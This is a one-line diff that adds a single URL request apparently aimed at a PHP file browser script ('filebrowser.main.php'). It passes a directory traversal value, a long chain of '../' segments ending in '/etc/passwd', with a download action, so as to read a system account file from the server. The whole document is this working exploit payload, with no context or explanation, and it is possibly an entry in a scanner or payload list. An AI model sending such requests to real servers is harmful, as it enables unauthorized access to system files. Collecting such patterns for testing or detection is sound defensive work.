@@ -1,0 +1,1 @@
+/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download
